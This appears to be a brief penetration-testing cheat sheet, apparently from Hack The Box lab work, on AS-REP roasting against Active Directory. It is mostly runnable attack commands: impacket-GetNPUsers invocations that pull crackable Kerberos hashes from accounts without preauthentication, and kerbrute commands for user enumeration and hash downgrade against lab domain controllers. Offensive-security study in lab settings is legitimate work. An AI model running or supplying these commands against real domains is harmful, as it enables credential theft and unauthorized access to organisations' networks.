
In this context, GetNPUsers is used to exploit the AS-REP (Authentication Service Response) protocol to request tickets without having the need to provide the account's password. **It targets user accounts that have the "Do not require Kerberos preauthentication" flag set, allowing the retrieval of credentials that can be cracked offline.**


**will give service user**
```sh
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
```

**will bring user hashes**

```sh
impacket-GetNPUsers joshi.local/ -dc-ip 192.168.1.100 -u user-Principal-Name-for-kerberoasting.txt
```


```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt 
```

**downgrade hash**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
```
